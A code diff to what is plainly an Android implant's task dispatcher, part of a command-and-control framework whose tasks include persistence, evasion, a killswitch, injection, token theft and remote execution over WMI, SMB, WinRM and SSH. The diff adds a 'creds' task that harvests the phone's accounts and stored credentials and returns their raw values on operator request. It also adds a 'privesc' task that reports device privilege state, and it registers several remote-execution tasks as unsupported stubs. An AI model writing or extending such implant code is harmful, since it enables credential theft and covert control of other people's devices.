@@ -28,7 +28,7 @@ object TaskRunner {
         "persist", "unpersist", "persist.list", "persist.verify",
         "persist.migrate", "persist.health",
         "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
-        "hygiene.memory",
+        "hygiene.memory", "creds", "privesc",
     )
 
     /**
@@ -95,6 +95,56 @@ object TaskRunner {
             fields.addAll(extra)
             return Upk.map(*fields.toTypedArray())
         }
+    }
+
+    /**
+     * The identity material of the phone.
+     *
+     * The shape is the shape of the desktop implant: a list of records with
+     * a kind, a source, an account and a confidence.  The value of a
+     * material is only sent when the operator asked for it.
+     */
+    fun credentials(args: Upk): Outcome {
+        val raw = args.field("raw")?.flag() ?: false
+        val mode = args.field("mode")?.text() ?: "local"
+        val entries = mutableListOf<Credentials.Entry>()
+        if (mode == "all" || mode == "local" || mode == "vault" || mode.isEmpty()) {
+            entries.addAll(Credentials.accounts(context?.android))
+            entries.addAll(Credentials.stateFiles(stateDir()))
+        }
+        if (mode == "all" || mode == "device") {
+            entries.addAll(Credentials.privilegeState())
+        }
+        val counts = mutableMapOf<String, Long>()
+        for (entry in entries) {
+            counts[entry.kind] = (counts[entry.kind] ?: 0L) + 1L
+        }
+        val countFields = counts.map { (kind, count) -> kind to Upk.num(count) }.toTypedArray()
+        return Outcome(0, Credentials.report(entries).toByteArray(), "")
+            .with("creds", Credentials.values(entries, raw))
+            .with("creds_total", Upk.num(entries.size.toLong()))
+            .with("creds_counts", Upk.map(*countFields))
+    }
+
+    /**
+     * The privilege state of the phone.
+     *
+     * The phone is not a Windows machine, so there is no token to steal:
+     * what the operator gets is the truth about the device.
+     */
+    fun privilegeState(): Outcome {
+        val entries = Credentials.privilegeState()
+        val attempts = entries.map { entry ->
+            Upk.map(
+                "technique" to Upk.str("device.${entry.source}"),
+                "outcome" to Upk.str(if (entry.confidence >= 50) "worked" else "unavailable"),
+                "detail" to Upk.str(entry.note),
+                "side_effects" to Upk.Arr(emptyList()),
+            )
+        }
+        return Outcome(0, Credentials.report(entries).toByteArray(), "")
+            .with("escalations", Upk.Arr(attempts))
+            .with("escalations_total", Upk.num(attempts.size.toLong()))
     }
 
     fun shell(command: String, timeoutSec: Long): Outcome {
@@ -316,13 +366,19 @@ object TaskRunner {
             "evade.shape" -> unsupported("evade.shape", "the traffic shaping needs the desktop implant")
             "hygiene.process" -> unsupported("hygiene.process", "the process hygiene needs the desktop implant")
             "scan" -> unsupported("scan", "network scanning needs the desktop implant")
+            "wmi.exec" -> unsupported("wmi.exec", "the remote execution needs the desktop implant")
+            "smb.exec" -> unsupported("smb.exec", "the remote execution needs the desktop implant")
+            "winrm.exec" -> unsupported("winrm.exec", "the remote execution needs the desktop implant")
+            "dcom.exec" -> unsupported("dcom.exec", "the remote execution needs the desktop implant")
+            "ldap.query" -> unsupported("ldap.query", "the remote execution needs the desktop implant")
+            "ssh.exec" -> unsupported("ssh.exec", "the remote execution needs the desktop implant")
             "p2p" -> unsupported("p2p", "peer links need the desktop implant")
             "bof" -> unsupported("bof", "COFF modules are a Windows capability")
             "ext" -> unsupported("ext", "extensions are a Windows capability")
             "inject" -> unsupported("inject", "injection is a Windows capability")
-            "creds" -> unsupported("creds", "the credential vault is a Windows capability")
+            "creds" -> credentials(args)
             "token" -> unsupported("token", "token impersonation is a Windows capability")
-            "privesc" -> unsupported("privesc", "privilege escalation is a Windows capability")
+            "privesc" -> privilegeState()
             "vpn" -> unsupported("vpn", "the layer-3 tunnel needs a tun device")
             "update" -> unsupported("update", "the implant is updated by the service")
             "session.open" -> unsupported("session.open", "an interactive session needs the desktop implant")
